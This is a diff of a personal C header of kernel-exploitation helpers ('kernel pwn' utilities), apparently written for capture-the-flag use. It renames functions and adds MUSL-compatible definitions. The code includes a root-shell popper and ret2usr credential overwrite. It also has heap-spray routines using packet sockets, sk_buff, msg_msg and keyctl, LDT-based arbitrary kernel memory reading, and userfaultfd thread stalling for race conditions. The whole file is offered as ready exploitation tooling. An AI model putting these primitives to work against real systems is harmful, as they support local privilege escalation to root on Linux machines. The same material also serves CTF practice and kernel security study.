@@ -2,8 +2,8 @@
  * @file kernel.h
  * @author arttnba3 (arttnba@gmail.com)
  * @brief arttnba3's personal utils for kernel pwn
- * @version 1.0
- * @date 2023-02-05
+ * @version 1.1
+ * @date 2023-05-20
  * 
  * @copyright Copyright (c) 2023 arttnba3
  * 
@@ -11,7 +11,10 @@
 #ifndef A3_KERNEL_PWN_H
 #define A3_KERNEL_PWN_H
 
-#define _GNU_SOURCE
+#ifndef _GNU_SOURCE
+  #define _GNU_SOURCE 
+#endif
+
 #include <sys/types.h>
 #include <stdio.h>
 #include <pthread.h>
@@ -32,12 +35,9 @@
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/wait.h>
-#include <asm/ldt.h>
 #include <semaphore.h>
 #include <poll.h>
 #include <sched.h>
-#include <linux/keyctl.h>
-#include <linux/userfaultfd.h>
 
 /**
  * I - fundamental functions
@@ -45,18 +45,33 @@
  */
 
 size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
+size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
+size_t init_task, init_nsproxy, init_cred;
 
-void errExit(char *msg)
+size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
+{
+    size_t page_count;
+
+    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
+    
+    return vmemmap_base + page_count * 0x40;
+}
+
+void err_exit(char *msg)
 {
     printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
+    sleep(5);
     exit(EXIT_FAILURE);
 }
 
 /* root checker and shell poper */
-void getRootShell(void)
+void get_root_shell(void)
 {
+    puts("[*] Checking for root...");
+
     if(getuid()) {
         puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+        sleep(5);
         exit(EXIT_FAILURE);
     }
 
@@ -71,19 +86,20 @@ void getRootShell(void)
 
 /* userspace status saver */
 size_t user_cs, user_ss, user_rflags, user_sp;
-void saveStatus()
+void save_status()
 {
-    __asm__("mov user_cs, cs;"
-            "mov user_ss, ss;"
-            "mov user_sp, rsp;"
-            "pushf;"
-            "pop user_rflags;"
-            );
-    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    asm volatile (
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_sp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+    );
+    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
 }
 
 /* bind the process to specific core */
-void bindCore(int core)
+void bind_core(int core)
 {
     cpu_set_t cpu_set;
 
@@ -94,8 +110,8 @@ void bindCore(int core)
     printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
 }
 
-/* ret2usr attacker */
-void getRootPrivilige(size_t prepare_kernel_cred, size_t commit_creds)
+/* for ret2usr attacker */
+void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds)
 {
     void *(*prepare_kernel_cred_ptr)(void *) = 
                                          (void *(*)(void*)) prepare_kernel_cred;
@@ -150,13 +166,6 @@ struct list_head {
 #define PACKET_VERSION 10
 #define PACKET_TX_RING 13
 
-struct tpacket_req {
-    unsigned int tp_block_size;
-    unsigned int tp_block_nr;
-    unsigned int tp_frame_size;
-    unsigned int tp_frame_nr;
-};
-
 /* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
 struct pgv_page_request {
     int idx;
@@ -172,19 +181,26 @@ enum {
     CMD_EXIT,
 };
 
-/* tpacket version for setsockopt */
-enum tpacket_versions {
-    TPACKET_V1,
-    TPACKET_V2,
-    TPACKET_V3,
-};
-
 /* pipe for cmd communication */
 int cmd_pipe_req[2], cmd_pipe_reply[2];
 
 /* create a socket and alloc pages, return the socket fd */
 int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
 {
+    /* tpacket version for setsockopt */
+    enum tpacket_versions {
+        TPACKET_V1,
+        TPACKET_V2,
+        TPACKET_V3,
+    };
+
+    struct tpacket_req {
+        unsigned int tp_block_size;
+        unsigned int tp_block_nr;
+        unsigned int tp_frame_size;
+        unsigned int tp_frame_nr;
+    };
+
     struct tpacket_req req;
     int socket_fd, version;
     int ret;
@@ -283,22 +299,47 @@ void spray_cmd_handler(void)
     } while (req.cmd != CMD_EXIT);
 }
 
+/* init pgv-exploit subsystem :) */
+void prepare_pgv_system(void)
+{
+    /* pipe for pgv */
+    pipe(cmd_pipe_req);
+    pipe(cmd_pipe_reply);
+    
+    /* child process for pages spray */
+    if (!fork()) {
+        spray_cmd_handler();
+    }
+}
+
 /**
  * IV - keyctl related
 */
 
-int key_alloc(char *description, char *payload, size_t plen)
+/**
+ * The MUSL also doesn't contain `keyctl.h` :( 
+ * Luckily we just need a bit of micros in exploitation, 
+ * so just define them directly is okay :)
+ */
+
+#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
+#define KEYCTL_UPDATE			2	/* update a key */
+#define KEYCTL_REVOKE			3	/* revoke a key */
+#define KEYCTL_UNLINK			9	/* unlink a key from a keyring */
+#define KEYCTL_READ			11	/* read a key or keyring's contents */
+
+int key_alloc(char *description, void *payload, size_t plen)
 {
     return syscall(__NR_add_key, "user", description, payload, plen, 
                    KEY_SPEC_PROCESS_KEYRING);
 }
 
-int key_update(int keyid, char *payload, size_t plen)
+int key_update(int keyid, void *payload, size_t plen)
 {
     return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
 }
 
-int key_read(int keyid, char *buffer, size_t buflen)
+int key_read(int keyid, void *buffer, size_t buflen)
 {
     return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
 }
@@ -325,7 +366,7 @@ int key_unlink(int keyid)
  * int sk_sockets[SOCKET_NUM][2];
  */
 
-int initSocketArray(int sk_socket[SOCKET_NUM][2])
+int init_socket_array(int sk_socket[SOCKET_NUM][2])
 {
     /* socket pairs to spray sk_buff */
     for (int i = 0; i < SOCKET_NUM; i++) {
@@ -338,7 +379,7 @@ int initSocketArray(int sk_socket[SOCKET_NUM][2])
     return 0;
 }
 
-int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
 {
     for (int i = 0; i < SOCKET_NUM; i++) {
         for (int j = 0; j < SK_BUFF_NUM; j++) {
@@ -352,7 +393,7 @@ int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
     return 0;
 }
 
-int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
 {
     for (int i = 0; i < SOCKET_NUM; i++) {
         for (int j = 0; j < SK_BUFF_NUM; j++) {
@@ -369,6 +410,10 @@ int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
 /**
  * VI - msg_msg related
 */
+
+#ifndef MSG_COPY
+#define MSG_COPY 040000
+#endif
 
 struct msg_msg {
     struct list_head m_list;
@@ -389,12 +434,12 @@ struct msgbuf {
 };
 */
 
-int getMsgQueue(void)
+int get_msg_queue(void)
 {
     return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
 }
 
-int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+ssize_t read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 {
     return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
 }
@@ -403,20 +448,20 @@ int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
  * the msgp should be a pointer to the `struct msgbuf`,
  * and the data should be stored in msgbuf.mtext
  */
-int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+ssize_t write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 {
     ((struct msgbuf*)msgp)->mtype = msgtyp;
     return msgsnd(msqid, msgp, msgsz, 0);
 }
 
 /* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
-int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+ssize_t peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 {
     return msgrcv(msqid, msgp, msgsz, msgtyp, 
                   MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
 }
 
-void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
+void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
               uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
 {
     msg->m_list.next = m_list_next;
@@ -431,11 +476,56 @@ void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
  * VII - ldt_struct related
 */
 
+/**
+ * Somethings we may want to compile the exp binary with MUSL-GCC, which
+ * doesn't contain the `asm/ldt.h` file.
+ * As the file is small, I copy that directly to here :)
+ */
+
+/* Maximum number of LDT entries supported. */
+#define LDT_ENTRIES	8192
+/* The size of each LDT entry. */
+#define LDT_ENTRY_SIZE	8
+
+#ifndef __ASSEMBLY__
+/*
+ * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
+ * not to the default values if you still want to do syscalls. This
+ * call is more for 32bit mode therefore.
+ */
+struct user_desc {
+	unsigned int  entry_number;
+	unsigned int  base_addr;
+	unsigned int  limit;
+	unsigned int  seg_32bit:1;
+	unsigned int  contents:2;
+	unsigned int  read_exec_only:1;
+	unsigned int  limit_in_pages:1;
+	unsigned int  seg_not_present:1;
+	unsigned int  useable:1;
+#ifdef __x86_64__
+	/*
+	 * Because this bit is not present in 32-bit user code, user
+	 * programs can pass uninitialized values here.  Therefore, in
+	 * any context in which a user_desc comes from a 32-bit program,
+	 * the kernel must act as though lm == 0, regardless of the
+	 * actual value.
+	 */
+	unsigned int  lm:1;
+#endif
+};
+
+#define MODIFY_LDT_CONTENTS_DATA	0
+#define MODIFY_LDT_CONTENTS_STACK	1
+#define MODIFY_LDT_CONTENTS_CODE	2
+
+#endif /* !__ASSEMBLY__ */
+
 /* this should be referred to your kernel */
 #define SECONDARY_STARTUP_64 0xffffffff81000060
 
 /* desc initializer */
-static inline void initializeDesc(struct user_desc *desc)
+static inline void init_desc(struct user_desc *desc)
 {
     /* init descriptor info */
     desc->base_addr = 0xff0000;
@@ -460,11 +550,11 @@ static inline void initializeDesc(struct user_desc *desc)
  * @param burte_size size of each burte-force hitting
  * @return size_t address of page_offset_base
  */
-size_t ldtGuessingDirectMappingArea(void *(*ldt_cracker)(void*),
-                                   void *cracker_args,
-                                   void *(*ldt_momdifier)(void*, size_t), 
-                                   void *momdifier_args,
-                                   uint64_t burte_size)
+size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
+                                        void *cracker_args,
+                                        void *(*ldt_momdifier)(void*, size_t), 
+                                        void *momdifier_args,
+                                        uint64_t burte_size)
 {
     struct user_desc desc;
 	uint64_t page_offset_base = 0xffff888000000000;
@@ -473,7 +563,7 @@ size_t ldtGuessingDirectMappingArea(void *(*ldt_cracker)(void*),
     int retval;
 
     /* init descriptor info */
-    initializeDesc(&desc);
+    init_desc(&desc);
 
     /* make the ldt_struct modifiable */
     ldt_cracker(cracker_args);
@@ -487,7 +577,9 @@ size_t ldtGuessingDirectMappingArea(void *(*ldt_cracker)(void*),
             break;
         }
         else if (retval == 0) {
-            errExit("no mm->context.ldt!");
+            printf("[x] no mm->context.ldt!");
+            page_offset_base = -1;
+            break;
         }
         page_offset_base += burte_size;
     }
@@ -505,8 +597,8 @@ size_t ldtGuessingDirectMappingArea(void *(*ldt_cracker)(void*),
  * @param addr address of kernel memory to read
  * @param res_buf buf to be written the data from kernel memory
  */
-void ldtArbitraryRead(void *(*ldt_momdifier)(void*, size_t), 
-                      void *momdifier_args, size_t addr, char *res_buf)
+void ldt_arbitrary_read(void *(*ldt_momdifier)(void*, size_t), 
+                        void *momdifier_args, size_t addr, char *res_buf)
 {
     static char buf[0x8000];
     struct user_desc desc;
@@ -514,7 +606,7 @@ void ldtArbitraryRead(void *(*ldt_momdifier)(void*, size_t),
     int pipe_fd[2];
 
     /* init descriptor info */
-    initializeDesc(&desc);
+    init_desc(&desc);
 
     /* modify the ldt_struct->entries to addr */
     ldt_momdifier(momdifier_args, addr);
@@ -546,12 +638,12 @@ void ldtArbitraryRead(void *(*ldt_momdifier)(void*, size_t),
  * @param page_offset_base the page_offset_base we leakked before
  * @param mem_finder your own function to search on a 0x8000-bytes buf.
  *          It should be like `size_t func(void *args, char *buf)` and the `buf`
- *          is where we store the data from kernel in ldtSeekingMemory().
+ *          is where we store the data from kernel in ldt_seeking_memory().
  *          The return val should be the offset of the `buf`, `-1` for failure
  * @param finder_args your own function's args
  * @return size_t kernel addr of content to find, -1 for failure
  */
-size_t ldtSeekingMemory(void *(*ldt_momdifier)(void*, size_t), 
+size_t ldt_seeking_memory(void *(*ldt_momdifier)(void*, size_t), 
                         void *momdifier_args, uint64_t page_offset_base,
                         size_t (*mem_finder)(void*, char *), void *finder_args)
 {
@@ -561,7 +653,7 @@ size_t ldtSeekingMemory(void *(*ldt_momdifier)(void*, size_t),
     search_addr = page_offset_base;
 
     while (1) {
-        ldtArbitraryRead(ldt_momdifier, momdifier_args, search_addr, buf);
+        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);
 
         offset = mem_finder(finder_args, buf);
         if (offset != -1) {
@@ -579,10 +671,104 @@ size_t ldtSeekingMemory(void *(*ldt_momdifier)(void*, size_t),
  * VIII - userfaultfd related code
  */
 
+/**
+ * The MUSL also doesn't contain `userfaultfd.h` :( 
+ * Luckily we just need a bit of micros in exploitation, 
+ * so just define them directly is okay :)
+ */
+
+#define UFFD_API ((uint64_t)0xAA)
+#define _UFFDIO_REGISTER		(0x00)
+#define _UFFDIO_COPY			(0x03)
+#define _UFFDIO_API			(0x3F)
+
+/* userfaultfd ioctl ids */
+#define UFFDIO 0xAA
+#define UFFDIO_API		_IOWR(UFFDIO, _UFFDIO_API,	\
+				      struct uffdio_api)
+#define UFFDIO_REGISTER		_IOWR(UFFDIO, _UFFDIO_REGISTER, \
+				      struct uffdio_register)
+#define UFFDIO_COPY		_IOWR(UFFDIO, _UFFDIO_COPY,	\
+				      struct uffdio_copy)
+
+/* read() structure */
+struct uffd_msg {
+	uint8_t	event;
+
+	uint8_t	reserved1;
+	uint16_t	reserved2;
+	uint32_t	reserved3;
+
+	union {
+		struct {
+			uint64_t	flags;
+			uint64_t	address;
+			union {
+				uint32_t ptid;
+			} feat;
+		} pagefault;
+
+		struct {
+			uint32_t	ufd;
+		} fork;
+
+		struct {
+			uint64_t	from;
+			uint64_t	to;
+			uint64_t	len;
+		} remap;
+
+		struct {
+			uint64_t	start;
+			uint64_t	end;
+		} remove;
+
+		struct {
+			/* unused reserved fields */
+			uint64_t	reserved1;
+			uint64_t	reserved2;
+			uint64_t	reserved3;
+		} reserved;
+	} arg;
+} __attribute__((packed));
+
+#define UFFD_EVENT_PAGEFAULT	0x12
+
+struct uffdio_api {
+    uint64_t api;
+    uint64_t features;
+    uint64_t ioctls;
+};
+
+struct uffdio_range {
+    uint64_t start;
+    uint64_t len;
+};
+
+struct uffdio_register {
+	struct uffdio_range range;
+#define UFFDIO_REGISTER_MODE_MISSING	((uint64_t)1<<0)
+#define UFFDIO_REGISTER_MODE_WP		((uint64_t)1<<1)
+    uint64_t mode;
+    uint64_t ioctls;
+};
+
+
+struct uffdio_copy {
+	uint64_t dst;
+	uint64_t src;
+	uint64_t len;
+#define UFFDIO_COPY_MODE_DONTWAKE		((uint64_t)1<<0)
+	uint64_t mode;
+	int64_t copy;
+};
+
+//#include <linux/userfaultfd.h>
+
 char temp_page_for_stuck[0x1000];
 
-void registerUserFaultFd(pthread_t *monitor_thread, void *addr,
-                        unsigned long len, void *(*handler)(void*))
+void register_userfaultfd(pthread_t *monitor_thread, void *addr,
+                          unsigned long len, void *(*handler)(void*))
 {
     long uffd;
     struct uffdio_api uffdio_api;
@@ -591,26 +777,30 @@ void registerUserFaultFd(pthread_t *monitor_thread, void *addr,
 
     /* Create and enable userfaultfd object */
     uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-    if (uffd == -1)
-        errExit("userfaultfd");
+    if (uffd == -1) {
+        err_exit("userfaultfd");
+    }
 
     uffdio_api.api = UFFD_API;
     uffdio_api.features = 0;
-    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
-        errExit("ioctl-UFFDIO_API");
+    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
+        err_exit("ioctl-UFFDIO_API");
+    }
 
     uffdio_register.range.start = (unsigned long) addr;
     uffdio_register.range.len = len;
     uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
-    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
-        errExit("ioctl-UFFDIO_REGISTER");
+    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
+        err_exit("ioctl-UFFDIO_REGISTER");
+    }
 
     s = pthread_create(monitor_thread, NULL, handler, (void *) uffd);
-    if (s != 0)
-        errExit("pthread_create");
+    if (s != 0) {
+        err_exit("pthread_create");
+    }
 }
 
-void *uffdHandlerForStuckingThread(void *args)
+void *uffd_handler_for_stucking_thread(void *args)
 {
     struct uffd_msg msg;
     int fault_cnt = 0;
@@ -621,30 +811,33 @@ void *uffdHandlerForStuckingThread(void *args)
 
     uffd = (long) args;
 
-    for (;;) 
-    {
+    for (;;) {
         struct pollfd pollfd;
         int nready;
         pollfd.fd = uffd;
         pollfd.events = POLLIN;
         nready = poll(&pollfd, 1, -1);
 
-        if (nready == -1)
-            errExit("poll");
+        if (nready == -1) {
+            err_exit("poll");
+        }
 
         nread = read(uffd, &msg, sizeof(msg));
 
         /* just stuck there is okay... */
         sleep(100000000);
 
-        if (nread == 0)
-            errExit("EOF on userfaultfd!\n");
+        if (nread == 0) {
+            err_exit("EOF on userfaultfd!\n");
+        }
 
-        if (nread == -1)
-            errExit("read");
+        if (nread == -1) {
+            err_exit("read");
+        }
 
-        if (msg.event != UFFD_EVENT_PAGEFAULT)
-            errExit("Unexpected event on userfaultfd\n");
+        if (msg.event != UFFD_EVENT_PAGEFAULT) {
+            err_exit("Unexpected event on userfaultfd\n");
+        }
 
         uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
         uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
@@ -652,22 +845,24 @@ void *uffdHandlerForStuckingThread(void *args)
         uffdio_copy.len = 0x1000;
         uffdio_copy.mode = 0;
         uffdio_copy.copy = 0;
-        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
-            errExit("ioctl-UFFDIO_COPY");
+        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
+            err_exit("ioctl-UFFDIO_COPY");
+        }
 
         return NULL;
     }
 }
 
-void registerUserFaultFdForThreadStucking(pthread_t *monitor_thread, 
+void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread, 
                                           void *buf, unsigned long len)
 {
-    registerUserFaultFd(monitor_thread, buf, len, uffdHandlerForStuckingThread);
+    register_userfaultfd(monitor_thread, buf, len, 
+                         uffd_handler_for_stucking_thread);
 }
 
 
 /**
- * IX - file and tty related structures 
+ * IX - kernel structures 
  */
 
 struct file;
@@ -677,7 +872,29 @@ struct tty_driver;
 struct serial_icounter_struct;
 struct ktermios;
 struct termiox;
-struct seq_file;
+struct seq_operations;
+
+struct seq_file {
+	char *buf;
+	size_t size;
+	size_t from;
+	size_t count;
+	size_t pad_until;
+	loff_t index;
+	loff_t read_pos;
+	uint64_t lock[4]; //struct mutex lock;
+	const struct seq_operations *op;
+	int poll_event;
+	const struct file *file;
+	void *private;
+};
+
+struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
 
 struct tty_operations {
     struct tty_struct * (*lookup)(struct tty_driver *driver,
@@ -723,6 +940,51 @@ struct tty_operations {
     void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
 #endif
     const struct file_operations *proc_fops;
+};
+
+struct page;
+struct pipe_inode_info;
+struct pipe_buf_operations;
+
+/* read start from len to offset, write start from offset */
+struct pipe_buffer {
+	struct page *page;
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+
+struct pipe_buf_operations {
+	/*
+	 * ->confirm() verifies that the data in the pipe buffer is there
+	 * and that the contents are good. If the pages in the pipe belong
+	 * to a file system, we may need to wait for IO completion in this
+	 * hook. Returns 0 for good, or a negative error value in case of
+	 * error.  If not present all pages are considered good.
+	 */
+	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * When the contents of this pipe buffer has been completely
+	 * consumed by a reader, ->release() is called.
+	 */
+	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * Attempt to take ownership of the pipe buffer and its contents.
+	 * ->try_steal() returns %true for success, in which case the contents
+	 * of the pipe (the buf->page) is locked and now completely owned by the
+	 * caller. The page may then be transferred to a different mapping, the
+	 * most often used case is insertion into different file address space
+	 * cache.
+	 */
+	int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * Get a reference to the pipe buffer.
+	 */
+	int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
 };
 
 #endif
